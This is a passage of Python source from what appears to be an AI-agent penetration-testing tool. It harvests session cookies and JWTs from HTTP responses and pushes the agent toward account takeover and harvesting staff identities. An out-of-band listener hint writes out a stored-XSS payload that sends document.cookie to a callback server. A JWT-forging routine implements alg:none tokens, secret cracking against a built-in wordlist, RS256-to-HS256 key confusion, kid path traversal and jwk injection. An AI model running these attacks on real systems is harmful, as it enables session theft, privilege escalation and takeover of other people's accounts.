            if "cookies" not in target.state or not isinstance(target.state["cookies"], dict):
                target.state["cookies"] = {}
            if r.cookies:
                target.state["cookies"].update(r.cookies.get_dict())
                for ck, cv in r.cookies.get_dict().items():
                    if any(x in ck.lower() for x in ("sess", "token", "auth", "sid", "jwt", "id", "cookie", "key")):
                        target.state["session_cookie"] = f"{ck}={cv}"
                    if isinstance(cv, str) and cv.startswith("eyJ") and cv.count(".") >= 1:
                        target.state["auth_token"] = cv
                        if "headers" not in target.state or not isinstance(target.state["headers"], dict):
                            target.state["headers"] = {}
                        target.state["headers"]["Authorization"] = f"Bearer {cv}"
            if raw_set_cookie:
                for part in raw_set_cookie.split(";"):
                    if "=" in part:
                        k, v = part.strip().split("=", 1)
                        k_clean = k.strip()
                        v_clean = v.strip()
                        if k_clean.lower() not in ("path", "domain", "expires", "max-age", "samesite", "httponly", "secure"):
                            target.state["cookies"][k_clean] = v_clean
                            if any(x in k_clean.lower() for x in ("sess", "token", "auth", "sid", "jwt", "id", "cookie", "key")):
                                target.state["session_cookie"] = f"{k_clean}={v_clean}"
                            if v_clean.startswith("eyJ") and v_clean.count(".") >= 1:
                                target.state["auth_token"] = v_clean
                                if "headers" not in target.state or not isinstance(target.state["headers"], dict):
                                    target.state["headers"] = {}
                                target.state["headers"]["Authorization"] = f"Bearer {v_clean}"

        # Extract JWT / auth tokens / reset tokens from JSON response bodies (top-level and nested)
        if hasattr(target, "state") and isinstance(target.state, dict):
            try:
                resp_json = r.json()
                if isinstance(resp_json, (dict, list)):
                    flattened_json = _flatten_json_dict(resp_json)
                    for full_k, v in flattened_json.items():
                        if not v or not isinstance(v, (str, int)):
                            continue
                        val_str = str(v).strip()
                        if not val_str or len(val_str) < 3:
                            continue
                        leaf_k = full_k.split(".")[-1].split("[")[0].lower()
                        if leaf_k in ("token", "access_token", "jwt", "auth_token", "accesstoken", "authtoken", "id_token", "session_token", "reset_token", "token_id"):
                            target.state["auth_token"] = val_str
                            if "headers" not in target.state or not isinstance(target.state["headers"], dict):
                                target.state["headers"] = {}
                            target.state["headers"]["Authorization"] = f"Bearer {val_str}"
                            break
            except Exception:
                pass
            save_target(target)

        # Inspect and decode JWT if present
        jwt_candidate = None
        if hasattr(target, "state") and isinstance(target.state, dict) and target.state.get("auth_token"):
            auth_val = target.state.get("auth_token")
            if isinstance(auth_val, str) and auth_val.startswith("eyJ") and auth_val.count(".") >= 1:
                jwt_candidate = auth_val
        if not jwt_candidate and r.cookies:
            for cv in r.cookies.get_dict().values():
                if isinstance(cv, str) and cv.startswith("eyJ") and cv.count(".") >= 1:
                    jwt_candidate = cv
                    break
        if not jwt_candidate and r.text:
            jwt_m = re.search(r'eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]*', r.text)
            if jwt_m:
                jwt_candidate = jwt_m.group(0)

        jwt_info = None
        if jwt_candidate and isinstance(jwt_candidate, str) and jwt_candidate.startswith("eyJ") and jwt_candidate.count(".") >= 1:
            try:
                parts = jwt_candidate.split(".")
                def _b64dec(s: str) -> Dict[str, Any]:
                    s = s.replace("-", "+").replace("_", "/")
                    s += "=" * ((4 - len(s) % 4) % 4)
                    return json.loads(base64.b64decode(s).decode("utf-8", errors="ignore"))
                hdr = _b64dec(parts[0]) if len(parts) > 0 else {}
                pay = _b64dec(parts[1]) if len(parts) > 1 else {}
                if hdr and pay:
                    role_val = pay.get("role") or pay.get("roles") or pay.get("isAdmin") or pay.get("admin") or "user"
                    jwt_info = {
                        "token": jwt_candidate,
                        "header": hdr,
                        "payload": pay,
                        "role": role_val,
                        "alg": hdr.get("alg")
                    }
                    if str(role_val).lower() not in ("admin", "administrator", "root", "true"):
                        jwt_info["privilege_escalation_hint"] = "Non-admin JWT detected. Test algorithm confusion (alg:none / None), RS256->HS256 key confusion, claim manipulation (role/groups/sub/permissions), or JWKS header injection."
            except Exception:
                pass

        # Extract detected routes, script bundles, and authorization logic from response
        detected_scripts = set()
        detected_routes = set()
        detected_api_endpoints = set()
        auth_logic_snippets = []

        if r.text:
            # 1. Detect JavaScript bundle assets (<script src="...">, /assets/*.js, etc.)
            for m in re.findall(r'''(?:src|href)\s*=\s*[\"']([^\"' >]+\.js(?:\?[^\"' >]*)?)[\"']''', r.text, re.I):
                clean_script = m.split("?")[0]
                detected_scripts.add(clean_script)
            for m in re.findall(r'''['\"](/[a-zA-Z0-9_\-\.\/]+\.js)['\"]''', r.text):
                detected_scripts.add(m)

            # 2. Detect general paths and links
            for m in re.findall(r'''(?:href|action|path|url|to)\s*=\s*[\"'](/[^\"' >]+)[\"']''', r.text, re.I):
                if not any(m.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".woff", ".ico")):
                    detected_routes.add(m)
            for m in re.findall(r'''['\"](/[a-zA-Z0-9_\-\.\/]+)['\"]''', r.text):
                if len(m) > 1 and not m.startswith("//") and not any(m.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".woff", ".ico")):
                    if m.endswith(".js"):
                        detected_scripts.add(m)
                    else:
                        detected_routes.add(m)
            for m in re.findall(r'''(?:window\.__BASE__\s*\|\|\s*['\"]['\"])\s*\+\s*['\"](/[^\"']+)['\"]''', r.text):
                detected_routes.add(m)

            # 3. Detect API endpoints (/api/...) and authorization logic if response is JS or large text
            is_js_response = url.endswith(".js") or "javascript" in r.headers.get("Content-Type", "").lower()
            for api_match in re.findall(r'''['\"](/[a-zA-Z0-9_\-\.\/]*api[a-zA-Z0-9_\-\.\/]*)['\"]''', r.text):
                if len(api_match) > 4 and not any(api_match.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".woff", ".ico")):
                    detected_api_endpoints.add(api_match)

            if is_js_response or len(r.text) > 1000:
                for line in re.findall(r'''[^;{}]*(?:role|owner|admin|entitlement|permission|is_admin|metadata|console|billing)[^;{}]{0,100}''', r.text, re.I):
                    line_clean = line.strip().replace("\n", " ")
                    if 10 < len(line_clean) < 120 and any(kw in line_clean.lower() for kw in ("role", "owner", "admin", "entitlement", "permission", "is_admin")):
                        if line_clean not in auth_logic_snippets:
                            auth_logic_snippets.append(line_clean)

        clean_routes = []
        for cr in sorted(list(detected_routes)):
            if not any(cr.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".ico", ".woff", ".js")):
                clean_routes.append(cr)
        clean_routes = clean_routes[:35]

        # Register discovered endpoints into target state
        if hasattr(target, "state") and isinstance(target.state, dict):
            if "endpoints" not in target.state or not isinstance(target.state["endpoints"], list):
                target.state["endpoints"] = []
            for ep in list(clean_routes) + list(detected_api_endpoints):
                full_url = ep if ep.startswith("http") else f"https://{target.name}{ep}"
                if full_url not in target.state["endpoints"]:
                    target.state["endpoints"].append(full_url)
            save_target(target)

        # Clean HTML response body so styles/svgs don't crowd out the actual forms/content/comments
        body_text = r.text or ""
        is_html = "text/html" in r.headers.get("Content-Type", "").lower() or body_text.strip().startswith("<!doctype") or body_text.strip().startswith("<html")
        if is_html:
            # Strip large <style> and <svg> blocks to prevent cutting off forms, hints, and test accounts
            body_text = re.sub(r'<style\b[^>]*>[\s\S]*?</style>', '<!-- [CSS style block omitted for brevity] -->', body_text, flags=re.I)
            body_text = re.sub(r'<svg\b[^>]*>[\s\S]*?</svg>', '<!-- [SVG omitted] -->', body_text, flags=re.I)

        # Detect HTML comments
        html_comments = []
        if is_html:
            for c in re.findall(r'<!--([\s\S]*?)-->', r.text):
                c_str = c.strip()
                if c_str and not c_str.startswith("[") and len(c_str) < 500:
                    html_comments.append(c_str)

        resp_dict: Dict[str, Any] = {
            "url": url,
            "status_code": r.status_code,
            "headers": dict(r.headers),
            "cookies": r.cookies.get_dict(),
            "body_preview": body_text[:35000]
        }

        # Code-level detection of authentication leaks / sensitive parameters in payload
        detected_leaks = []
        try:
            rj = r.json()
            if isinstance(rj, (dict, list)):
                flat = _flatten_json_dict(rj)
                for fk, fv in flat.items():
                    leaf = fk.split(".")[-1].split("[")[0].lower()
                    if leaf in ("token", "reset_token", "reset_url", "reset_link", "password", "pass", "secret", "key", "api_key", "mfa_secret", "code", "otp", "preview"):
                        if fv and isinstance(fv, (str, int)) and str(fv).strip():
                            v_clean = str(fv).strip()
                            if v_clean.lower() not in ("true", "false", "null", "none", "undefined", "{}", "[]"):
                                detected_leaks.append(f"{fk} = '{v_clean}'")
        except Exception:
            pass

        # The check above only catches a token sitting under a dedicated
        # JSON key (e.g. "reset_token": "..."). It's blind to a token
        # embedded INSIDE a string value — e.g. a "message" field that
        # reads "...reset link: https://host/reset?token=abc123..." — the
        # single most common shape for a leaked password-reset token,
        # since APIs very often phrase it as a sentence/URL rather than a
        # bare field. Regex-scan the raw body text itself (not just JSON
        # key names) for token-bearing query params and standalone
        # long-random-looking tokens near reset/verify/confirm language,
        # so this reaches the model exactly like a key-based leak does.
        try:
            body_scan_text = r.text or ""
            if body_scan_text:
                for qp_match in re.finditer(
                    r'[?&](token|reset_token|reset_code|code|otp|verify_token|confirmation_token|t)=([A-Za-z0-9_\-\.]{8,})',
                    body_scan_text, re.I
                ):
                    val = qp_match.group(2)
                    entry = f"embedded_url_param.{qp_match.group(1)} = '{val}'"
                    if entry not in detected_leaks:
                        detected_leaks.append(entry)
                for kv_match in re.finditer(
                    r'''["']?(reset[_-]?token|reset[_-]?code|verification[_-]?code)["']?\s*[:=]\s*["']([A-Za-z0-9_\-\.]{8,})["']''',
                    body_scan_text, re.I
                ):
                    entry = f"embedded_text.{kv_match.group(1)} = '{kv_match.group(2)}'"
                    if entry not in detected_leaks:
                        detected_leaks.append(entry)
        except Exception:
            pass

        if detected_leaks:
            resp_dict["LEAK_ALERT"] = (
                f"CRITICAL DATA LEAK DETECTED IN RESPONSE BODY: "
                f"{len(detected_leaks)} sensitive parameter(s) exposed ({', '.join(detected_leaks[:5])}). "
                f"Do NOT report 'no leakage'. Analyze these parameters and immediately execute the next attack step (e.g. password reset / account takeover / token substitution)!"
            )

        # Code-level detection of authentication failures
        if method == "POST" and any(k in url.lower() for k in ("login", "auth", "signin", "session")):
            if any(err in r.text.lower() for err in ("invalid username or password", "invalid credentials", "incorrect password", "login failed", "authentication failed")):
                resp_dict["auth_status"] = "FAILED: Server returned an authentication failure message ('Invalid username or password'). This login attempt did NOT succeed."
            elif (r.status_code in (200, 302, 303) and (target.state.get("session_cookie") or target.state.get("auth_token"))):
                resp_dict["auth_status"] = "SUCCESSFUL LOGIN: Active session established."
                resp_dict["authenticated_recon_directive"] = (
                    "AUTHENTICATED SESSION ACQUIRED. Next actions: "
                    "1) Run 'spider' on the internal portal (e.g. url='https://.../portal') or systematically fetch all internal routes with 'curl'. "
                    "2) Thoroughly inspect all accessible internal staff, directory, user, and profile pages for leaked target personal information, bios, security question answers, or password reset flows."
                )

        if html_comments:
            resp_dict["discovered_html_comments"] = html_comments[:10]
        if jwt_info:
            resp_dict["jwt_info"] = jwt_info
        if detected_scripts:
            clean_scripts = sorted(list(detected_scripts))[:10]
            resp_dict["discovered_script_assets"] = clean_scripts
            resp_dict["methodology_hint"] = (
                f"CLIENT JAVASCRIPT DETECTED ({len(clean_scripts)} file(s)). "
                f"Do NOT guess API endpoints blind. Fetch referenced JavaScript bundle(s) with curl "
                f"to extract the exact client route table, API endpoints, and role/authorization logic."
            )
        if detected_api_endpoints:
            resp_dict["discovered_api_endpoints"] = sorted(list(detected_api_endpoints))[:25]
        if auth_logic_snippets:
            resp_dict["authorization_logic_snippets"] = auth_logic_snippets[:15]
        if clean_routes:
            resp_dict["detected_routes"] = clean_routes
            # Routes shaped like a newsroom/team/staff-directory page are the
            # single most common place a lab or real target leaks real staff
            # names/emails/usernames — exactly the kind of thing account
            # takeover objectives ("harvest an employee, then attack that
            # identity") depend on. Force this to the model's attention
            # instead of letting it get skipped in favor of guessing
            # credentials against generic/placeholder identifiers.
            content_leak_routes = [
                r for r in clean_routes
                if re.search(r'(blog|news|press|posts?|article|about|team|staff|author|people|newsroom)',
                             r, re.I)
            ]
            if content_leak_routes:
                resp_dict["content_recon_hint"] = (
                    f"ROUTE(S) LIKELY TO LEAK REAL STAFF IDENTITIES DETECTED: {content_leak_routes[:8]}. "
                    f"Fetch these with curl BEFORE testing any credentials — content/blog/team pages are "
                    f"the most common source of real employee names, emails, and usernames on a target. "
                    f"Any identifier you haven't personally observed in an actual tool result against this "
                    f"target is not real and must not be tested."
                )

        # 404 + this path's first segment has a singular/plural twin already
        # in this target's discovered endpoints -> near-certain wrong-path
        # guess, not a genuinely missing ID. This is real evidence from this
        # target's own history, not a generic reminder — much harder to
        # ignore than prompt wording, and it's what would have caught
        # /letters/<id> vs /letter/<id> on the very first 404, not the
        # eleventh.
        if resp_dict.get("status_code") == 404 and hasattr(target, "state") and isinstance(target.state, dict):
            try:
                req_segments = [s for s in urlparse(url).path.split("/") if s]
                if req_segments:
                    variants = set(_singular_plural_variants(req_segments[0]))
                    if variants:
                        for ep in target.state.get("endpoints", []):
                            ep_segments = [s for s in urlparse(ep).path.split("/") if s]
                            if ep_segments and ep_segments[0] in variants:
                                resp_dict["endpoint_mismatch_hint"] = (
                                    f"404 on path segment '{req_segments[0]}' — but '{ep_segments[0]}' (singular/"
                                    f"plural variant) already exists in THIS target's discovered endpoints, e.g. "
                                    f"'{ep}'. Before trying more IDs against '{req_segments[0]}', try this same ID "
                                    f"against '{ep_segments[0]}' instead. Several sequential 404s on the same path "
                                    f"segment is a signal you have the wrong path, not that the IDs don't exist."
                                )
                                break
            except Exception:
                pass

        return resp_dict
    except Exception as e:
        return {
            "url": url,
            "error": str(e)
        }


COMMON_JWT_SECRETS = (
    "secret", "Secret", "SECRET", "your-256-bit-secret", "your-secret-key", "secretkey",
    "jwtsecret", "jwt_secret", "jwt-secret", "jwt-secret-key", "supersecret", "super-secret",
    "changeme", "change-me", "password", "Password1", "123456", "admin", "test", "testing",
    "qwerty", "letmein", "topsecret", "top-secret", "key", "private", "privatekey",
    "mysecretkey", "s3cr3t", "verysecret", "very-secret-key", "shhhh", "shh",
    "flag", "ctf", "hackthebox", "tryhackme", "thm", "htb", "development", "dev",
    "production", "prod", "prod_secret", "backend_secret", "api_secret", "api-secret",
    "auth_secret", "session_secret", "signing_key", "signingkey", "hmac_secret",
    "null", "undefined", "none", "0", "1", "abc123", "letmein123", "welcome",
    "django-insecure", "insecure", "not-a-secret", "some-secret", "webtoken",
    "webtokensecret", "jsonwebtoken", "jwtkey", "jwt.io", "keyboard cat",
    "your-secret", "myapp_secret", "app_secret", "app-secret", "flask-secret-key",
    "express-secret", "node_secret", "", "0" * 32, "0" * 64,
)


def _execute_listener(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Start or poll a local out-of-band (OOB) HTTP listener, for confirming
    blind or stored vulns where there's no direct response leakage to check
    against — e.g. stored/blind XSS exfiltrating document.cookie via
    fetch(), blind SSRF, blind SQLi/XXE. Previously this listener
    (oob_utils.OOBServer) existed fully working but was never wired into
    the tool registry, so there was no way to actually spin one up.
    """
    from hellhound.core.oob_utils import get_or_create_oob_server

    action = (args.get("action") or "start").lower()
    srv = get_or_create_oob_server(target.name)

    if action == "start":
        host, port = srv.start()
        if not host:
            return {"status": "error", "error": "Could not bind a local listener port (8000-9000 all appear in use)."}
        url = srv.get_url()
        return {
            "status": "success",
            "listener_url": url,
            "hint": (
                f"Listener is live at {url} and will stay up for the rest of this "
                f"session. Embed it in the payload so the target calls back to it — "
                f"e.g. for stored XSS cookie theft: "
                f"<script>fetch('{url}/c?x='+document.cookie)</script>. Put a unique "
                f"random token in the callback path or query string so a later "
                f"poll can match the hit to this specific payload instead of any "
                f"unrelated noise (e.g. '{url}/c?tok=<random>&x='+document.cookie)."
            )
        }

    if action == "poll":
        token = str(args.get("token", "")).strip()
        # Cap was already raised to 300s (see comment above) so an explicit
        # long wait is respected — but the DEFAULT when no timeout is given
        # was still 10s, and in practice the model kept calling poll with no
        # explicit timeout (or small ones) and giving up after ~60s total
        # despite the xss skill itself warning that reviewed/blind payloads
        # can take much longer than that. Raised the default so a plain
        # poll(token=...) call — the common case — gets real coverage
        # instead of quitting almost immediately.
        timeout = max(1, min(int(args.get("timeout", 45) or 45), 300))
        if not token:
            return {
                "status": "error",
                "error": "poll requires 'token' — the unique string embedded in the payload's callback URL, used to match hits."
            }
        if not srv.host:
            return {"status": "error", "error": "No listener is running yet for this target. Call action='start' first."}
        got_hit, raw = srv.poll(token, timeout=timeout)
        if got_hit:
            return {"status": "success", "hit": True, "data": raw}
        return {"status": "success", "hit": False, "note": f"No callback received containing '{token}' within {timeout}s (this poll call actually waited the full requested {timeout}s). Past hits are never discarded — a later poll (even a short one) will still catch a delayed callback, so re-polling after a longer gap works too. If still nothing after a genuinely long wait, the payload likely isn't firing at all (sanitized, not rendered, or no reviewer ever visits the content) rather than just needing more time."}

    if action == "stop":
        srv.stop()
        return {"status": "success", "stopped": True}

    return {"status": "error", "error": f"Unknown action '{action}'. Use 'start', 'poll', or 'stop'."}


def _execute_jwt_forge(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Decode and forge JWTs for privilege escalation and auth bypass testing.
    Also safely handles the common false-friend case: a dot-separated,
    base64url-looking cookie (e.g. Flask's default 'session' cookie) that
    LOOKS like a JWT but is actually a framework-signed session blob with
    no claims structure. That case still gets fully decoded and returned
    via 'decoded_session_content' below instead of being turned away —
    only truly opaque, undecodable IDs (sess_..., connect.sid, PHPSESSID)
    are rejected outright, since those carry no embedded payload at all.
    Techniques (all run by default via algorithm='all', or select individually):
      - alg:none                unsigned-token bypass, case + trailing-dot variants
      - hs_crack                brute-forces the real HMAC secret against a built-in
                                 common-secret wordlist (or a supplied wordlist) and,
                                 on a hit, produces a *legitimately* signed forged token
      - hs256 confusion         RS256->HS256 public-key-as-HMAC-secret confusion, tried
                                 across several byte-encodings of the supplied key/secret
                                 since exact PEM formatting varies between JWT libraries
      - kid_injection           kid path-traversal to /dev/null, signed with an empty
                                 HMAC secret (classic CTF/lab trick — /dev/null reads as
                                 zero bytes, so an empty secret produces a valid signature)
      - jwk_injection           embeds a self-generated RSA public key directly in the
                                 header's `jwk` claim and self-signs with the matching
                                 private key, for servers that naively trust an inline jwk
                                 header instead of validating against a known key. Requires
                                 the `cryptography` package; skipped with a note if absent.
    """
    token = args.get("token")
    if not token and hasattr(target, "state") and isinstance(target.state, dict):
        token = target.state.get("auth_token")
        if not token and "cookies" in target.state and isinstance(target.state["cookies"], dict):
            for ck, cv in target.state["cookies"].items():
                if isinstance(cv, str) and cv.startswith("eyJ") and cv.count(".") >= 1:
                    token = cv
                    break

    if not token:
        return {
            "status": "error",
            "error": "No JWT token provided or found in target session state.",
            "hint": "Inspect target session state. If cookies are opaque (e.g. sess_..., connect.sid, PHPSESSID), the application uses server-side sessions, NOT JWTs. Look for mass assignment, nested property injection, or business logic flaws instead."
        }

    # Terminal-result cache, keyed on the exact token string: whether a
    # value decodes as a real JWT (valid header+payload) or not is settled
    # BEFORE 'claims'/'algorithm' are ever read below, so that verdict is
    # identical no matter what claims/algorithm a later call passes. Without
    # this, the orchestrator's generic "already ran this exact tool+args"
    # dedup never fires here — varying claims/algorithm each time makes
    # every call look like a "new" attempt — and the model can burn several
    # calls re-testing a question that was already answered for good on the
    # first one. Cache the verdict per token and refuse instantly on repeats.
    #
    # Flask/itsdangerous session cookies also change on every request (the
    # flash-message payload rotates), so a NEW cookie value from the same
    # target still isn't caught by the per-token cache above — the model
    # kept re-triggering a fresh decode-and-fail cycle on every new session
    # cookie from the same target, printing a red error line in the CLI each
    # time even though the target's cookie FORMAT was already established.
    # Once we know a target uses non-JWT sessions at all, stop re-verifying
    # per-token and answer quietly (no error, no red line) instead.
    non_jwt_cache = None
    target_confirmed_non_jwt = False
    if hasattr(target, "state") and isinstance(target.state, dict):
        non_jwt_cache = target.state.setdefault("_confirmed_non_jwt_tokens", {})
        target_confirmed_non_jwt = bool(target.state.get("_target_uses_non_jwt_sessions"))

        if token in non_jwt_cache or target_confirmed_non_jwt:
            return {
                "status": "skipped",
                "note": (
                    "Already established this target's session cookies aren't JWTs — "
                    "skipping the re-check. Use decoded_session_content from the earlier "
                    "call, or work off the session directly."
                ),
                "decoded_session_content": non_jwt_cache.get(token),
            }

    # Strict check: Reject obvious placeholder strings or opaque cookies
    if "..." in token or token.startswith("sess_") or token.count(".") < 1:
        return {
            "status": "error",
            "error": f"The provided token '{token[:30]}...' is not a valid JSON Web Token (JWT). It appears to be an opaque session identifier or placeholder. JWT attacks (alg:none, algorithm confusion) only apply to dot-separated base64url JWTs.",
            "hint": "Do NOT attempt JWT forgery on opaque session cookies. Check application JavaScript and API endpoints for mass assignment (e.g. updating profile/account attributes via PATCH/PUT/POST) or IDOR."
        }


    def b64url_decode_json(s: str) -> Dict[str, Any]:
        s = s.replace("-", "+").replace("_", "/")
        s += "=" * ((4 - len(s) % 4) % 4)
        try:
            return json.loads(base64.b64decode(s).decode("utf-8", errors="ignore"))
        except Exception:
            return {}

    def b64url_decode_raw(s: str) -> bytes:
        s = s.replace("-", "+").replace("_", "/")
        s += "=" * ((4 - len(s) % 4) % 4)
        try:
            return base64.b64decode(s)
        except Exception:
            return b""

    def b64url_encode(obj: Any) -> str:
        if isinstance(obj, (dict, list)):
            raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
        elif isinstance(obj, str):
            raw = obj.encode("utf-8")
        elif isinstance(obj, bytes):
            raw = obj
        else:
            raw = bytes(obj)
        return base64.urlsafe_b64encode(raw).decode("utf-8").rstrip("=")

    def hs256_sign(hdr: Dict[str, Any], pay: Dict[str, Any], secret_bytes: bytes) -> str:
        hdr_b64 = b64url_encode(hdr)
        pay_b64 = b64url_encode(pay)
        signing_input = f"{hdr_b64}.{pay_b64}".encode("utf-8")
        sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
        return f"{hdr_b64}.{pay_b64}.{b64url_encode(sig)}"

    def try_non_jwt_session_decode(raw_segment: str):
        """
        Best-effort decode for dot-separated tokens that LOOK JWT-shaped but
        aren't — most commonly a framework-signed session cookie like
        Flask's itsdangerous sessions, which are also '.'-joined and
        base64url-encoded but carry a plain (optionally zlib-compressed)
        JSON blob with no JWT header/claims structure. Returns the decoded
        object if this reads as plausible JSON, else None.
        """
        raw = b64url_decode_raw(raw_segment)
        if not raw:
            return None
        try:
            return json.loads(raw.decode("utf-8"))
        except Exception:
            pass
        try:
            import zlib
            return json.loads(zlib.decompress(raw).decode("utf-8"))
        except Exception:
            return None

    parts = token.strip().split(".")
    if len(parts) < 2:
        return {
            "status": "error",
            "error": "Token is not a valid JWT (must have at least 2 dot-separated segments).",
            "hint": "Check if target uses opaque session cookies rather than JWTs."
        }

    header = b64url_decode_json(parts[0])
    payload = b64url_decode_json(parts[1])
    original_sig_b64 = parts[2] if len(parts) > 2 else ""

    if not header or not payload:
        # Don't just say "decode failed" — show what's actually in there.
        # Guessing claims (role/isAdmin/admin) blindly against a token that
        # was never a JWT (e.g. a Flask itsdangerous session cookie, which
        # is also dot-separated and superficially JWT-shaped) is exactly
        # what was happening before this fix: repeated forge attempts with
        # no grounding in the token's real content.
        raw_previews = []
        decoded_session_content = None
        for i, seg in enumerate(parts[:2]):
            raw_bytes = b64url_decode_raw(seg)
            if not raw_bytes:
                continue
            try:
                text_preview = raw_bytes[:200].decode("utf-8")
            except Exception:
                text_preview = repr(raw_bytes[:200])
            raw_previews.append(f"segment[{i}]: {text_preview}")
            if decoded_session_content is None:
                decoded_session_content = try_non_jwt_session_decode(seg)

        result = {
            "status": "not_a_jwt",
            "note": "Nah bro, this ain't a JWT — the segments don't even decode to valid JSON. Not going to sit here guessing claims out of thin air, so check raw_content_seen below for what's actually in there.",
            "raw_content_seen": raw_previews if raw_previews else "Segments did not even base64-decode to bytes.",
            "hint": "Do not guess/forge claims (role, isAdmin, admin, etc.) here — check raw_content_seen (and decoded_session_content, if present) for what's actually inside before assuming anything about this token. A dot-separated-but-non-JWT shape is common for framework-signed session cookies (e.g. Flask's itsdangerous sessions) carrying plain session/flash data, not auth claims — forging claims against those does nothing. If that's what this is, look for IDOR, mass assignment, or business-logic flaws instead. This is settled for this exact token — do not call jwt_forge on it again with different claims/algorithm values, that will not change anything."
        }
        if decoded_session_content is not None:
            result["decoded_session_content"] = decoded_session_content
            result["note"] = "Nah bro, it's not a JWT — just a plain signed session cookie (see decoded_session_content), no claims or role field in there for you to forge. This one's settled, don't call jwt_forge on it again."
        if non_jwt_cache is not None:
            non_jwt_cache[token] = decoded_session_content
        if hasattr(target, "state") and isinstance(target.state, dict):
            target.state["_target_uses_non_jwt_sessions"] = True
        return result

    target_claims = args.get("claims") or {"role": "admin"}
    forged_payload = dict(payload)
    forged_payload.update(target_claims)

    algo = (args.get("algorithm") or "all").lower()
    pub_or_secret = args.get("public_key_or_secret") or ""
    custom_wordlist = args.get("wordlist") or []

    forged_tokens = []
    techniques_run = []
    cracked_secret = None

    # 1. alg: none variations — case variants x with/without the trailing dot,
    # since different JWT libraries disagree on whether the empty signature
    # segment (and its trailing dot) must be present.
    if algo in ("none", "all"):
        techniques_run.append("alg_none")
        for alg_val in ("none", "None", "NONE"):
            hdr_none = dict(header)
            hdr_none["alg"] = alg_val
            hdr_b64 = b64url_encode(hdr_none)
            pay_b64 = b64url_encode(forged_payload)
            for suffix, style in ((".", "with trailing dot"), ("", "no trailing segment")):
                forged_tokens.append({
                    "type": f"alg:{alg_val}",
                    "description": f"Unsigned JWT with alg={alg_val} ({style})",
                    "token": f"{hdr_b64}.{pay_b64}{suffix}"
                })

    # 2. HS256 secret cracking — tests the ORIGINAL token's real signature
    # against a wordlist of common/default secrets. Unlike the confusion
    # attacks below, a hit here means the forged token is legitimately
    # signed with the application's actual key, not a validation-bypass
    # guess, so it will pass even a correctly-implemented verifier.
    #
    # Deliberately NOT included in the default 'all' bundle: the free
    # bypasses below (alg:none, kid_injection, jwk_injection) cost nothing
    # to try and often work on their own. Only run hs_crack explicitly
    # (algorithm='hs_crack') after testing those against the server and
    # confirming they were rejected — cracking is the escalation step, not
    # the first move.
    if algo == "hs_crack" and original_sig_b64 and header.get("alg", "").upper().startswith("HS"):
        techniques_run.append("hs_crack")
        signing_input = f"{parts[0]}.{parts[1]}".encode("utf-8")
        target_sig = b64url_decode_raw(original_sig_b64)
        candidates = list(dict.fromkeys(list(custom_wordlist) + list(COMMON_JWT_SECRETS)))
        digest_fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(
            header.get("alg", "HS256").upper(), hashlib.sha256
        )
        for candidate in candidates:
            if not isinstance(candidate, str):
                continue
            guess_sig = hmac.new(candidate.encode("utf-8"), signing_input, digest_fn).digest()
            if hmac.compare_digest(guess_sig, target_sig):
                cracked_secret = candidate
                forged_tok = hs256_sign(header, forged_payload, candidate.encode("utf-8"))
                forged_tokens.insert(0, {
                    "type": f"alg:{header.get('alg')} (cracked secret)",
                    "description": f"Legitimately signed with recovered secret {candidate!r} — real key, not a bypass guess.",
                    "token": forged_tok
                })
                break
        if cracked_secret is None and emit and hasattr(emit, "info"):
            emit.info(f"[*] jwt_forge: tested {len(candidates)} common secrets against the HMAC signature — no match.")

    # 3. RS256 -> HS256 algorithm confusion (if public key/secret provided).
    # Tried across several byte-encodings of the key: exact JWT libraries
    # are picky about trailing newlines / CRLF vs LF / surrounding
    # whitespace in the PEM text used as the HMAC key, so a single encoding
    # often silently fails even when the underlying key is correct.
    if algo in ("hs256", "all") and pub_or_secret:
        techniques_run.append("hs256_confusion")
        raw = pub_or_secret
        variants = {
            "as-is": raw,
            "stripped": raw.strip(),
            "stripped+trailing-newline": raw.strip() + "\n",
            "CRLF-normalized": raw.replace("\r\n", "\n"),
        }
        seen_keys = set()
        for label, variant in variants.items():
            key_bytes = variant.encode("utf-8")
            if key_bytes in seen_keys:
                continue
            seen_keys.add(key_bytes)
            hdr_hs = dict(header)
            hdr_hs["alg"] = "HS256"
            tok_hs = hs256_sign(hdr_hs, forged_payload, key_bytes)
            forged_tokens.append({
                "type": "alg:HS256 (public key confusion)",
                "description": f"HMAC-SHA256 signed using supplied key/secret, encoding: {label}",
                "token": tok_hs
            })
        # Also try the raw base64-decoded bytes in case the captured "public
        # key" was actually base64 DER rather than PEM text.
        decoded = b64url_decode_raw(raw.strip())
        if decoded and decoded not in seen_keys:
            hdr_hs = dict(header)
            hdr_hs["alg"] = "HS256"
            tok_hs = hs256_sign(hdr_hs, forged_payload, decoded)
            forged_tokens.append({
                "type": "alg:HS256 (public key confusion)",
                "description": "HMAC-SHA256 signed using base64-decoded raw key bytes",
                "token": tok_hs
            })

    # 4. kid header path traversal to /dev/null. Some backends resolve the
    # `kid` header to a file path to load the signing key; pointing it at
    # /dev/null (which reads as zero bytes) lets an attacker sign with a
    # known, empty HMAC secret.
    if algo in ("kid_injection", "all"):
        techniques_run.append("kid_injection")
        for kid_val in ("../../../../../../../../../../dev/null", "/dev/null"):
            hdr_kid = dict(header)
            hdr_kid["kid"] = kid_val
            hdr_kid["alg"] = "HS256"
            tok_kid = hs256_sign(hdr_kid, forged_payload, b"")
            forged_tokens.append({
                "type": "kid:/dev/null (empty secret)",
                "description": f"kid='{kid_val}', signed with an empty HMAC secret",
                "token": tok_kid
            })

    # 5. Embedded JWK header self-signing — generate our own RSA keypair,
    # embed the public half directly in the header's `jwk` claim, and sign
    # with the matching private key. Servers that pull the verification key
    # straight out of the token's own header (instead of a trusted key
    # store) will happily validate a token signed by the attacker.
    if algo in ("jwk_injection", "all"):
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa, padding
            from cryptography.hazmat.primitives import hashes

            techniques_run.append("jwk_injection")
